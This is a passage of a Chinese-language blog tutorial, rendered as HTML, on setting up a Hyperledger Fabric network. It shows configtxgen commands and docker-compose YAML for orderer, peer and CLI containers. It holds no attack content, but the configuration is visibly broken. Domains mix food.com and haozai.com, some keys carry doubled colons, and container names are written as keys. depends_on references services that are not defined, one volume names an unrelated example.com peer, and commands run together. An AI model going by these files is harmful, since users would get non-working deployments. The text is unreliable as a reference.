pan><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>锚节点 ，负责和组织间通信的节点。</p><h3 id="使用命令生成创世块"><a href="#使用命令生成创世块" class="headerlink" title="使用命令生成创世块"></a>使用命令生成创世块</h3><pre class="line-numbers language-shell"><code class="language-shell">configtxgen -profile foodGenesis -outputBlock ./genesis.block#HaozaiOrgsOrdererGenesis 配置文件中区块的名字 ， <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>把genesis.block放到特定的目录  channel-artifacts</p><h3 id="使用命令生成通道文件"><a href="#使用命令生成通道文件" class="headerlink" title="使用命令生成通道文件"></a>使用命令生成通道文件</h3><pre class="line-numbers language-shell"><code class="language-shell">configtxgen -profile HaozaiOrgsChannel -outputCreateChannelTx test.tx -channelID haozaichannelconfigtxgen -profile foodchannel -outputCreateChannelTx test.tx -channelID foodfchannelconfigtxgen -profile foodchannel -outputCreateChannelTx testSDK.tx -channelID foodfchannel#HaozaiOrgsChannel 是通道的名字#channel.tx 通道名字#haozaichannel 通道的id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生成锚节点的更新文件（可选）"><a href="#生成锚节点的更新文件（可选）" class="headerlink" title="生成锚节点的更新文件（可选）"></a>生成锚节点的更新文件（可选）</h3><pre class="line-numbers language-shell"><code class="language-shell">configtxgen -profile HaozaiOrgsChannel -outputAnchorPeersUpdate GOMSPanchors.tx -channelID haozaichannel -asOrg OrgGoMSP#GOMSPanchors.tx 锚节点文件名字#当前锚节点属于haozaichannel通道，若没有指定，则默认未mychannel#当前组织是OrgGoMSP#生成锚节点更新文件configtxgen -profile HaozaiOrgsChannel -outputAnchorPeersUpdate CPPMSPanchors.tx -channelID haozaichannel -asOrg OrgCppMSP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个组织对应一个锚节点的更新文件</p><h2 id="4、docker-compose文件的编写"><a href="#4、docker-compose文件的编写" class="headerlink" title="4、docker-compose文件的编写"></a>4、docker-compose文件的编写</h2><h3 id="docker-compose-cli"><a href="#docker-compose-cli" class="headerlink" title="docker-compose-cli"></a>docker-compose-cli</h3><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Copyright IBM Corp. All Rights Reserved.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># SPDX-License-Identifier: Apache-2.0</span><span class="token comment" spellcheck="true">#</span><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span>  <span class="token comment" spellcheck="true">#docker-compose版本</span><span class="token comment" spellcheck="true">#docker镜像映射到本地，</span><span class="token comment" spellcheck="true"># /var/lib/docker/volumes/ orderer.example.com</span><span class="token key atrule">volumes</span><span class="token punctuation">:</span>   <span class="token punctuation">-</span> <span class="token key atrule">orderer.food.com</span><span class="token punctuation">:</span>   <span class="token punctuation">-</span> <span class="token key atrule">peer0.org1.food.com</span><span class="token punctuation">:</span>   <span class="token punctuation">-</span> <span class="token key atrule">peer0.org2.food.com</span><span class="token punctuation">:</span>   <span class="token punctuation">-</span> <span class="token key atrule">peer0.org3.food.com</span><span class="token punctuation">:</span>   <span class="token punctuation">-</span> <span class="token key atrule">peer0.org4.food.com</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#把所有docker放到同一个网络中</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>  <span class="token key atrule">byfn</span><span class="token punctuation">:</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">orderer.food.com</span><span class="token punctuation">:</span>    <span class="token key atrule">extends</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#继承属性</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span>   base/docker<span class="token punctuation">-</span>compose<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> orderer.food.com    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> orderer.food.com <span class="token comment" spellcheck="true"># 容器的名字，一般用域名</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token comment" spellcheck="true">#在byfn网络中</span>  <span class="token key atrule">peer0.org1.food.com</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> peer0.org1.food.com  <span class="token comment" spellcheck="true">#容器名字 ，一般用域名</span>    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span>  base/docker<span class="token punctuation">-</span>compose<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span>  peer0.org1.food.com    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token comment" spellcheck="true">#在byfn网络中</span>  <span class="token key atrule">peer0.org2.haozai.com:</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> <span class="token key atrule">peer1.orggo.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span>  base/docker<span class="token punctuation">-</span>compose<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> <span class="token key atrule">peer1.orggo.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token key atrule">peer0.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> <span class="token key atrule">peer0.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span>  base/docker<span class="token punctuation">-</span>compose<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> <span class="token key atrule">peer0.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token key atrule">peer1.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> <span class="token key atrule">peer1.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span>  base/docker<span class="token punctuation">-</span>compose<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> <span class="token key atrule">peer1.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token comment" spellcheck="true">#客户端终端，Linux终端</span>  <span class="token key atrule">cli</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> cli    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>tools<span class="token punctuation">:</span>latest    <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true  </span><span class="token comment" spellcheck="true">#终端 ，有</span>    <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true">#标准输入打开</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#环境变量</span>      <span class="token punctuation">-</span> SYS_CHANNEL=haozaichannel      <span class="token punctuation">-</span> GOPATH=/opt/gopath      <span class="token punctuation">-</span> CORE_VM_ENDPOINT=unix<span class="token punctuation">:</span>///host/var/run/docker.sock      <span class="token comment" spellcheck="true">#- FABRIC_LOGGING_SPEC=DEBUG</span>      <span class="token punctuation">-</span> FABRIC_LOGGING_SPEC=INFO      <span class="token punctuation">-</span> CORE_PEER_ID=cli   <span class="token comment" spellcheck="true">#客户端ID</span>      <span class="token punctuation">-</span> CORE_PEER_ADDRESS=peer0.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">7051 </span><span class="token comment" spellcheck="true">#客户端要连接的Peer节点地址</span>      <span class="token punctuation">-</span> CORE_PEER_LOCALMSPID=OrgGoMSP  <span class="token comment" spellcheck="true">#连接的Peer节点地址对应的ID</span>      <span class="token punctuation">-</span> CORE_PEER_TLS_ENABLED=true      <span class="token punctuation">-</span> CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/tls/server.crt      <span class="token punctuation">-</span> CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/tls/server.key      <span class="token punctuation">-</span> CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/tls/ca.crt      <span class="token punctuation">-</span> CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/users/Admin@orggo.haozai.com/msp    <span class="token key atrule">working_dir</span><span class="token punctuation">:</span> /opt/gopath/src/github.com/hyperledger/fabric/peer <span class="token comment" spellcheck="true">#工作目录</span>    <span class="token key atrule">command</span><span class="token punctuation">:</span> /bin/bash  <span class="token comment" spellcheck="true">#执行的命令</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#卷的挂载</span>        <span class="token punctuation">-</span> /var/run/<span class="token punctuation">:</span>/host/var/run/  <span class="token comment" spellcheck="true">#映射</span>        <span class="token punctuation">-</span> ./chaincode/<span class="token punctuation">:</span>/opt/gopath/src/github.com/chaincode   <span class="token comment" spellcheck="true">#链码目录</span>        <span class="token punctuation">-</span> ./crypto<span class="token punctuation">-</span>config<span class="token punctuation">:</span>/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/  <span class="token comment" spellcheck="true">#证书</span>        <span class="token comment" spellcheck="true">#- ./scripts:/opt/gopath/src/github.com/hyperledger/fabric/peer/scripts/  #脚本</span>        <span class="token punctuation">-</span> ./channel<span class="token punctuation">-</span>artifacts<span class="token punctuation">:</span>/opt/gopath/src/github.com/hyperledger/fabric/peer/channel<span class="token punctuation">-</span>artifacts <span class="token comment" spellcheck="true">#之前生成的文件</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#规定服务的启动顺序</span>      <span class="token punctuation">-</span> orderer.haozai.com      <span class="token punctuation">-</span> peer0.orggo.haozai.com      <span class="token punctuation">-</span> peer1.orggo.haozai.com      <span class="token punctuation">-</span> peer0.orgcpp.haozai.com      <span class="token punctuation">-</span> peer1.orgcpp.haozai.com    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="docker-compose-base-yaml"><a href="#docker-compose-base-yaml" class="headerlink" title="docker-compose-base.yaml"></a>docker-compose-base.yaml</h3><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Copyright IBM Corp. All Rights Reserved.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># SPDX-License-Identifier: Apache-2.0</span><span class="token comment" spellcheck="true">#</span><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">orderer.haozai.com</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#排序节点服务 和docker-compose-cli 中的  service: orderer.example.com 对应</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> orderer.haozai.com    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> orderer<span class="token punctuation">-</span>base  <span class="token comment" spellcheck="true">#镜像在peer-base中</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> ../channel<span class="token punctuation">-</span>artifacts/genesis.block<span class="token punctuation">:</span>/var/hyperledger/orderer/orderer.genesis.block        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/ordererOrganizations/haozai.com/orderers/orderer.haozai.com/msp<span class="token punctuation">:</span>/var/hyperledger/orderer/msp        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/ordererOrganizations/haozai.com/orderers/orderer.haozai.com/tls/<span class="token punctuation">:</span>/var/hyperledger/orderer/tls        <span class="token punctuation">-</span> orderer.haozai.com<span class="token punctuation">:</span>/var/hyperledger/production/orderer    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 7050<span class="token punctuation">:</span><span class="token number">7050</span>  <span class="token key atrule">peer0.orggo.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> peer0.orggo.haozai.com    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_PEER_ID=peer0.orggo.haozai.com      <span class="token punctuation">-</span> CORE_PEER_ADDRESS=peer0.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">7051</span>      <span class="token punctuation">-</span> CORE_PEER_LISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">7051</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODEADDRESS=peer0.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">7052</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">7052</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_BOOTSTRAP=peer0.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">7051</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">7051</span>      <span class="token punctuation">-</span> CORE_PEER_LOCALMSPID=OrgGoMSP    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /var/run/<span class="token punctuation">:</span>/host/var/run/        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/msp<span class="token punctuation">:</span>/etc/hyperledger/fabric/msp        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/tls<span class="token punctuation">:</span>/etc/hyperledger/fabric/tls        <span class="token punctuation">-</span> peer0.orggo.haozai.com<span class="token punctuation">:</span>/var/hyperledger/production    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 7051<span class="token punctuation">:</span><span class="token number">7051</span>      <span class="token punctuation">-</span> 7052<span class="token punctuation">:</span><span class="token number">7052</span>  <span class="token key atrule">peer1.orggo.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> peer1.orggo.haozai.com    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_PEER_ID=peer1.orggo.haozai.com      <span class="token punctuation">-</span> CORE_PEER_ADDRESS=peer1.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">8051</span>      <span class="token punctuation">-</span> CORE_PEER_LISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">8051</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODEADDRESS=peer1.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">8052</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">8052</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer1.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">8051</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_BOOTSTRAP=peer1.orggo.haozai.com<span class="token punctuation">:</span><span class="token number">8051</span>      <span class="token punctuation">-</span> CORE_PEER_LOCALMSPID=OrgGoMSP    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /var/run/<span class="token punctuation">:</span>/host/var/run/        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orggo.haozai.com/peers/peer1.orggo.haozai.com/msp<span class="token punctuation">:</span>/etc/hyperledger/fabric/msp        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orggo.haozai.com/peers/peer1.orggo.haozai.com/tls<span class="token punctuation">:</span>/etc/hyperledger/fabric/tls        <span class="token punctuation">-</span> peer1.orggo.haozai.com<span class="token punctuation">:</span>/var/hyperledger/production    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 8051<span class="token punctuation">:</span><span class="token number">8051</span>      <span class="token punctuation">-</span> 8052<span class="token punctuation">:</span><span class="token number">8052</span>  <span class="token key atrule">peer0.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> peer0.orgcpp.haozai.com    <span class="token key atrule">extends</span><span class="token punctuation">:</span>        <span class="token key atrule">file</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_PEER_ID=peer0.orgcpp.haozai.com      <span class="token punctuation">-</span> CORE_PEER_ADDRESS=peer0.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">9051</span>      <span class="token punctuation">-</span> CORE_PEER_LISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">9051</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODEADDRESS=peer0.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">9052</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">9052</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">9051</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_BOOTSTRAP=peer0.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">9051</span>      <span class="token punctuation">-</span> CORE_PEER_LOCALMSPID=OrgCppMSP    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /var/run/<span class="token punctuation">:</span>/host/var/run/        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orgcpp.haozai.com/peers/peer0.orgcpp.haozai.com/msp<span class="token punctuation">:</span>/etc/hyperledger/fabric/msp        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orgcpp.haozai.com/peers/peer0.orgcpp.haozai.com/tls<span class="token punctuation">:</span>/etc/hyperledger/fabric/tls        <span class="token punctuation">-</span> peer0.orgcpp.haozai.com<span class="token punctuation">:</span>/var/hyperledger/production    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 9051<span class="token punctuation">:</span><span class="token number">9051</span>      <span class="token punctuation">-</span> 9052<span class="token punctuation">:</span><span class="token number">9052</span>  <span class="token key atrule">peer1.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> peer1.orgcpp.haozai.com    <span class="token key atrule">extends</span><span class="token punctuation">:</span>      <span class="token key atrule">file</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base.yaml      <span class="token key atrule">service</span><span class="token punctuation">:</span> peer<span class="token punctuation">-</span>base    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_PEER_ID=peer1.orgcpp.haozai.com      <span class="token punctuation">-</span> CORE_PEER_ADDRESS=peer1.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">10051</span>      <span class="token punctuation">-</span> CORE_PEER_LISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">10051</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODEADDRESS=peer1.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">10052</span>      <span class="token punctuation">-</span> CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0<span class="token punctuation">:</span><span class="token number">10052</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer1.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">10051</span>      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_BOOTSTRAP=peer1.orgcpp.haozai.com<span class="token punctuation">:</span><span class="token number">10051</span>      <span class="token punctuation">-</span> CORE_PEER_LOCALMSPID=OrgCppMSP    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /var/run/<span class="token punctuation">:</span>/host/var/run/        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orgcpp.haozai.com/peers/peer1.orgcpp.haozai.com/msp<span class="token punctuation">:</span>/etc/hyperledger/fabric/msp        <span class="token punctuation">-</span> ../crypto<span class="token punctuation">-</span>config/peerOrganizations/orgcpp.haozai.com/peers/peer1.orgcpp.haozai.com/tls<span class="token punctuation">:</span>/etc/hyperledger/fabric/tls        <span class="token punctuation">-</span> peer1.org2.example.com<span class="token punctuation">:</span>/var/hyperledger/production    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 10051<span class="token punctuation">:</span><span class="token number">10051</span>      <span class="token punctuation">-</span> 10052<span class="token punctuation">:</span><span class="token number">10052</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="peer-base-yaml"><a href="#peer-base-yaml" class="headerlink" title="peer-base.yaml"></a>peer-base.yaml</h3><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Copyright IBM Corp. All Rights Reserved.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># SPDX-License-Identifier: Apache-2.0</span><span class="token comment" spellcheck="true">#</span><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">peer-base</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>peer<span class="token punctuation">:</span>latest     <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_VM_ENDPOINT=unix<span class="token punctuation">:</span>///host/var/run/docker.sock      <span class="token comment" spellcheck="true"># the following setting starts chaincode containers on the same</span>      <span class="token comment" spellcheck="true"># bridge network as the peers</span>      <span class="token comment" spellcheck="true"># https://docs.docker.com/compose/networking/</span>      <span class="token punctuation">-</span> CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=haozai_byfn      <span class="token punctuation">-</span> FABRIC_LOGGING_SPEC=INFO      <span class="token comment" spellcheck="true">#- FABRIC_LOGGING_SPEC=DEBUG</span>      <span class="token punctuation">-</span> CORE_PEER_TLS_ENABLED=true      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_USELEADERELECTION=true      <span class="token punctuation">-</span> CORE_PEER_GOSSIP_ORGLEADER=false      <span class="token punctuation">-</span> CORE_PEER_PROFILE_ENABLED=true      <span class="token punctuation">-</span> CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt      <span class="token punctuation">-</span> CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key      <span class="token punctuation">-</span> CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt    <span class="token key atrule">working_dir</span><span class="token punctuation">:</span> /opt/gopath/src/github.com/hyperledger/fabric/peer    <span class="token key atrule">command</span><span class="token punctuation">:</span> peer node start  <span class="token key atrule">orderer-base</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>orderer<span class="token punctuation">:</span>latest    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> FABRIC_LOGGING_SPEC=INFO      <span class="token punctuation">-</span> ORDERER_GENERAL_LISTENADDRESS=0.0.0.0      <span class="token punctuation">-</span> ORDERER_GENERAL_GENESISMETHOD=file      <span class="token punctuation">-</span> ORDERER_GENERAL_GENESISFILE=/var/hyperledger/orderer/orderer.genesis.block      <span class="token punctuation">-</span> ORDERER_GENERAL_LOCALMSPID=OrdererMSP      <span class="token punctuation">-</span> ORDERER_GENERAL_LOCALMSPDIR=/var/hyperledger/orderer/msp      <span class="token comment" spellcheck="true"># enabled TLS</span>      <span class="token punctuation">-</span> ORDERER_GENERAL_TLS_ENABLED=true      <span class="token punctuation">-</span> ORDERER_GENERAL_TLS_PRIVATEKEY=/var/hyperledger/orderer/tls/server.key      <span class="token punctuation">-</span> ORDERER_GENERAL_TLS_CERTIFICATE=/var/hyperledger/orderer/tls/server.crt      <span class="token punctuation">-</span> ORDERER_GENERAL_TLS_ROOTCAS=<span class="token punctuation">[</span>/var/hyperledger/orderer/tls/ca.crt<span class="token punctuation">]</span>      <span class="token punctuation">-</span> ORDERER_KAFKA_TOPIC_REPLICATIONFACTOR=1      <span class="token punctuation">-</span> ORDERER_KAFKA_VERBOSE=true      <span class="token punctuation">-</span> ORDERER_GENERAL_CLUSTER_CLIENTCERTIFICATE=/var/hyperledger/orderer/tls/server.crt      <span class="token punctuation">-</span> ORDERER_GENERAL_CLUSTER_CLIENTPRIVATEKEY=/var/hyperledger/orderer/tls/server.key      <span class="token punctuation">-</span> 